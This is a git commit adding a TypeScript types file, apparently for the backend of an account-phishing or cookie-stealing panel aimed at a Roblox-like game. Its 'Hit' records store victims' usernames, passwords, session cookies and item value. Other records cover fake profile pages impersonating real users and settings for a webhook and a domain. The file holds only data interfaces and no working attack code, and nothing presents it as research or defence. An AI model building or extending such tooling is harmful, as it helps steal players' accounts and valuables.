07d01a77dac301be502b9418d3e2717be34897f9
vantaofficial <turkicriss@gmail.com>
2026-07-17 20:30:49 +0500

    Create types.ts

---
+++ backend/src/types.ts
@@ -0,0 +1,62 @@
+export interface User {
+    id: number;
+    username: string;
+    password: string;
+    role: string;
+    created_at: string;
+}
+
+export interface Hit {
+    id: number;
+    user: string;
+    cookie: string;
+    password: string;
+    rap: number;
+    summary: number;
+    value: number;
+    created_at: string;
+}
+
+export interface Settings {
+    id: number;
+    domain: string;
+    site_id: string;
+    site_code: string;
+    webhook_url: string;
+    auth_enabler: boolean;
+    age_changer: boolean;
+}
+
+export interface Profile {
+    id: number;
+    real_username: string;
+    fake_username: string;
+    display_name: string;
+    premium: boolean;
+    friends: number;
+    followers: number;
+    followings: number;
+    status: string;
+    creation_date: string;
+    description: string;
+}
+
+export interface Group {
+    id: number;
+    group_url: string;
+    owner: string;
+    name: string;
+    members: number;
+    verified: boolean;
+    funds: number;
+    description: string;
+    shout: string;
+}
+
+export interface Game {
+    id: number;
+    name: string;
+    status: string;
+    creation_date: string;
+    description: string;
+}
